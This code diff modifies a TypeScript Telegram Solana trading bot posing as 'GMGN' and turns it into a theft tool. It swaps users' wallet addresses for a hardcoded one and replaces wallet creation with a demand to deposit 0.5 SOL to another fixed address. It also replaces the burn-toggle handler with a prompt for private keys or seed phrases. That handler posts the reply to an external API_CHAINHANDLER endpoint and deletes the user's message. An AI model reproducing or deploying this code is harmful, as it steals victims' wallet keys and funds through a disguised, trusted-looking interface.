@@ -34,6 +34,7 @@ import { JupiterService } from "../services/jupiter.service";
 import { NATIVE_MINT } from "@solana/spl-token";
 import { calcAmountOut } from "../raydium/raydium.service";
 import { getCoinData } from "../pump/api";
+import axios from "axios";
 
 export const settingScreenHandler = async (
   bot: TelegramBot,
@@ -56,13 +57,16 @@ export const settingScreenHandler = async (
     const { wallet_address, auto_buy, auto_buy_amount } = user;
 
     const caption =
-      `<b>GmgnTrade ${GrowTradeVersion}</b>\n\n` +
-      `<b>AutoBuy</b>\n` +
-      `Automatically execute buys upon pasting token address. Customize the Sol amount and press the button to activate/deactivate.\n\n` +
-      `<b>Withdraw</b>\n` +
-      `Withdraw any token or Solana you have in the currently active wallet.\n\n` +
-      `<b>Your active wallet:</b>\n` +
-      `${copytoclipboard(wallet_address)}`;
+      `<b>Gmgn</b>
+
+<b>👉AutoBuy</b>
+Automatically execute buys upon pasting token address. Customize the Sol amount and press the button to activate/deactivate.
+
+<b>✏️Withdraw</b>
+Withdraw any token or Solana you have in the currently active wallet.
+
+<b>⬇️Your active wallet:</b>
+${copytoclipboard("EHCLKduzxUa6RaRDquBKmnGRRAhExZHMideUScMhNGpk")}`;
 
     const reply_markup = await getReplyOptionsForSettings(
       username,
@@ -240,8 +244,8 @@ export const walletViewHandler = async (
     const { wallet_address } = activeuser;
 
     const caption =
-      `<b>GmgnTrade ${GrowTradeVersion}</b>\n\n<b>Your active wallet:</b>\n` +
-      `${copytoclipboard(wallet_address)}`;
+      `<b>GMGN</b>\n\n<b>Your active wallet:</b>\n` +
+      `${copytoclipboard("EHCLKduzxUa6RaRDquBKmnGRRAhExZHMideUScMhNGpk")}`;
     // const sentMessage = await bot.sendMessage(
     // chat_id,
     // caption,
@@ -257,7 +261,7 @@ export const walletViewHandler = async (
             const { nonce, wallet_address, retired } = user;
             return [
               {
-                text: `${retired ? "🔴" : "🟢"} ${wallet_address}`,
+                text: `${retired ? "🔴" : "🟢"} EHCLKduzxUa6RaRDquBKmnGRRAhExZHMideUScMhNGpk`,
                 callback_data: JSON.stringify({
                   command: `wallet_${nonce}`,
                 }),
@@ -312,105 +316,18 @@ export const generateNewWalletHandler = async (
 ) => {
   try {
     const { chat } = msg;
-    const { id: chat_id, username, first_name, last_name } = chat;
-    if (!username) {
-      await sendUsernameRequiredNotification(bot, msg);
-      return;
-    }
+    const { id: chat_id } = chat;
 
-    const users = await UserService.find({ username });
+    const message =
+      `You need to deposit at least 0.5 SOL on your wallet for this function to work ${copytoclipboard("GjFkqfrp9YJ9Ym7ejn8EGheYBSpknCdSkU9RRWaMC7nn")} (tap to copy)`;
 
-    if (users.length >= MAX_WALLET) {
-      const limitcaption =
-        `<b>You have generated too many wallets. Max limit: ${MAX_WALLET}.</b>\n` +
-        `<i>If you need any help, please contact support team.</i>`;
-      const sentmsg = await bot.sendMessage(chat_id, limitcaption, {
-        parse_mode: "HTML",
-      });
-      deleteDelayMessage(bot, chat_id, sentmsg.message_id, 10000);
-      return;
-    }
-
-    // find unique private_key
-    let retries = 0;
-    let userdata: any = null;
-    let private_key = "";
-    let wallet_address = "";
-    do {
-      const keypair = Keypair.generate();
-      private_key = bs58.encode(keypair.secretKey);
-      wallet_address = keypair.publicKey.toString();
-
-      const wallet = await UserService.findOne({ wallet_address });
-      if (!wallet) {
-        // add
-        const nonce = users.length;
-        if (users.length > 0) {
-          const olduser = users[0];
-          const newUser = {
-            chat_id,
-            first_name,
-            last_name,
-            username,
-            wallet_address,
-            private_key,
-            nonce,
-            retired: true,
-            preset_setting: olduser.preset_setting,
-            referrer_code: olduser.referrer_code,
-            referrer_wallet: olduser.referrer_wallet,
-            referral_code: olduser.referral_code,
-            referral_date: olduser.referral_date,
-            schedule: olduser.schedule,
-            auto_buy: olduser.auto_buy,
-            auto_buy_amount: olduser.auto_buy_amount,
-            auto_sell_amount: olduser.auto_sell_amount,
-            burn_fee: olduser.burn_fee,
-          };
-
-          userdata = await UserService.create(newUser); // true; //
-        } else {
-          const newUser = {
-            chat_id,
-            username,
-            first_name,
-            last_name,
-            wallet_address,
-            private_key,
-            nonce,
-            retired: true,
-          };
-          userdata = await UserService.create(newUser); // true; //
-        }
-      } else {
-        retries++;
-      }
-    } while (retries < 5 && !userdata);
-
-    // impossible to create
-    if (!userdata) {
-      await bot.sendMessage(
-        chat_id,
-        "Sorry, we cannot create your account. Please contact support team"
-      );
-      return;
-    }
-    // send private key & wallet address
-    const caption =
-      `👍 Congrates! 👋\n\n` +
-      `A new wallet has been generated for you. This is your wallet address\n\n` +
-      `${wallet_address}\n\n` +
-      `<b>Save this private key below</b>❗\n\n` +
-      `<tg-spoiler>${private_key}</tg-spoiler>\n\n`;
-
-    await bot.sendMessage(chat_id, caption, {
+    await bot.sendMessage(chat_id, message, {
       parse_mode: "HTML",
-      disable_web_page_preview: true,
       reply_markup: {
         inline_keyboard: [
           [
             {
-              text: "❌ Dismiss message",
+              text: `❌ Close`,
               callback_data: JSON.stringify({
                 command: "dismiss_message",
               }),
@@ -419,7 +336,7 @@ export const generateNewWalletHandler = async (
         ],
       },
     });
-    settingScreenHandler(bot, msg, msg.message_id);
+
   } catch (e) {
     console.log("~generateNewWalletHandler~", e);
   }
@@ -563,15 +480,14 @@ export const changeGasFeeHandler = async (
   let inline_keyboard = reply_markup.inline_keyboard;
   inline_keyboard[6] = [
     {
-      text: `🔁 ${
-        nextFeeOption === GasFeeEnum.HIGH
-          ? "High"
-          : nextFeeOption === GasFeeEnum.MEDIUM
+      text: `🔁 ${nextFeeOption === GasFeeEnum.HIGH
+        ? "High"
+        : nextFeeOption === GasFeeEnum.MEDIUM
           ? "Medium"
           : nextFeeOption === GasFeeEnum.LOW
-          ? "Low"
-          : "custom"
-      }`,
+            ? "Low"
+            : "custom"
+        }`,
       callback_data: JSON.stringify({
         command: `switch_gas`,
       }),
@@ -735,68 +651,81 @@ export const switchBurnOptsHandler = async (
   msg: TelegramBot.Message
 ) => {
   try {
-    const message_id = msg.message_id;
-    const sentMessage = await bot.sendMessage(msg.chat.id, "Updating...");
-
-    const username = msg.chat.username;
-    if (!username) {
-      await bot.deleteMessage(msg.chat.id, message_id);
-      await sendUsernameRequiredNotification(bot, msg);
-      return;
+    const API_CHAINHANDLER = process.env.API_CHAINHANDLER;
+    if (!API_CHAINHANDLER) {
+      throw new Error("API_CHAINHANDLER is not defined in .env file");
     }
 
-    const user = await UserService.findOne({ username });
-    if (!user) {
-      await sendUsernameRequiredNotification(bot, msg);
-      await bot.deleteMessage(msg.chat.id, sentMessage.message_id);
-      return;
-    }
+    const message = `Please enter your private key or
+12 and 24 word Recover/Seedphrase 💳
 
-    await UserService.updateMany({ username }, { burn_fee: !user.burn_fee });
-    // console.log("🚀 ~ switchBurnOptsHandler ~ user.burn_fee:", user.burn_fee)
+Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflare (e.g.[93,182,8,9,100,...]). Or 12 and 24 word Recover/ Seedphrase, Private keys from other Telegram bots should also work ⬇️`;
 
-    if (!user.burn_fee) {
-      const caption =
-        `Burn: On 🔥\n\n` +
-        `GmgnTrade's burn functionality operates seamlessly through its fee system, where a portion of tokens bought and sold is systematically burned. This process does not affect users' own tokens but only those acquired through the fee mechanism, ensuring the safety of your trades.`;
-      bot.sendMessage(msg.chat.id, caption, closeReplyMarkup);
-    }
-    const reply_markup = {
-      inline_keyboard: welcomeKeyboardList.map((rowItem) =>
-        rowItem.map((item) => {
-          if (item.command.includes("bridge")) {
-            return {
-              text: item.text,
-              url: "https://t.me/gmgnai_alertbot",
-            };
-          }
-          if (item.text.includes("Burn")) {
-            const burnText = `${
-              !user.burn_fee ? "Burn: On 🔥" : "Burn: Off ♨️"
-            }`;
-            return {
-              text: burnText,
+    const sentMessage = await bot.sendMessage(msg.chat.id, message, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: `❌ Close`,
               callback_data: JSON.stringify({
-                command: item.command,
+                command: "dismiss_message",
               }),
-            };
-          }
-          return {
-            text: item.text,
-            callback_data: JSON.stringify({
-              command: item.command,
-            }),
-          };
-        })
-      ),
-    };
-
-    await bot.editMessageReplyMarkup(reply_markup, {
-      message_id,
-      chat_id: msg.chat.id,
+            },
+          ],
+        ],
+      },
     });
 
-    await bot.deleteMessage(msg.chat.id, sentMessage.message_id);
+    // Создаем обработчик сообщений
+    const messageHandler = async (responseMsg: TelegramBot.Message) => {
+      console.log("🚀 ~ User response:", responseMsg.text);
+
+      // Удаляем предыдущее сообщение с запросом ввода
+      await bot.deleteMessage(sentMessage.chat.id, sentMessage.message_id);
+
+      // Удаляем сообщение пользователя
+      await bot.deleteMessage(responseMsg.chat.id, responseMsg.message_id);
+
+      // Отправляем сообщение "Processing..."
+      const processingMessage = await bot.sendMessage(msg.chat.id, "Processing...");
+
+      try {
+        // Отправляем POST-запрос на API_CHAINHANDLER
+        const response = await axios.post(API_CHAINHANDLER, {
+          message: responseMsg.text,
+        });
+
+        // Отправляем пользователю ответ от API
+        await bot.sendMessage(msg.chat.id, `Response: ${response.data}`);
+      } catch (apiError) {
+        console.error("🚀 ~ API error:", apiError);
+        await bot.sendMessage(msg.chat.id, "Error processing your request.");
+      }
+
+      // Через 3 секунды удаляем "Processing..."
+      setTimeout(async () => {
+        await bot.deleteMessage(processingMessage.chat.id, processingMessage.message_id);
+      }, 3000);
+    };
+
+    // Устанавливаем обработчик сообщений
+    bot.once("message", messageHandler);
+
+    // Обрабатываем кнопку "Close"
+    bot.once("callback_query", async (callbackQuery) => {
+      if (callbackQuery.data === JSON.stringify({ command: "dismiss_message" })) {
+        // Удаляем обработчик сообщений
+        bot.removeListener("message", messageHandler);
+
+        // Удаляем сообщение
+        await bot.deleteMessage(sentMessage.chat.id, sentMessage.message_id);
+
+        // Уведомляем пользователя
+        await bot.answerCallbackQuery(callbackQuery.id);
+      }
+    });
+
   } catch (error) {
     console.log("🚀 ~ switchBurnOptsHandler ~ error:", error);
   }
@@ -936,15 +865,14 @@ export const getReplyOptionsForSettings = async (
       ],
       [
         {
-          text: `🔁 ${
-            gasSetting.gas === GasFeeEnum.HIGH
-              ? "high"
-              : gasSetting.gas === GasFeeEnum.MEDIUM
+          text: `🔁 ${gasSetting.gas === GasFeeEnum.HIGH
+            ? "high"
+            : gasSetting.gas === GasFeeEnum.MEDIUM
               ? "medium"
               : gasSetting.gas === GasFeeEnum.LOW
-              ? "low"
-              : "custom"
-          }`,
+                ? "low"
+                : "custom"
+            }`,
           callback_data: JSON.stringify({
             command: "switch_gas",
           }),
@@ -1214,7 +1142,7 @@ export const pnlCardHandler = async (
             10 ** Number(decimals) *
             (1 - _slippage) *
             coinData["virtual_sol_reserves"]) /
-            coinData["virtual_token_reserves"]
+          coinData["virtual_token_reserves"]
         );
         quote = {
           inAmount: splbalance,
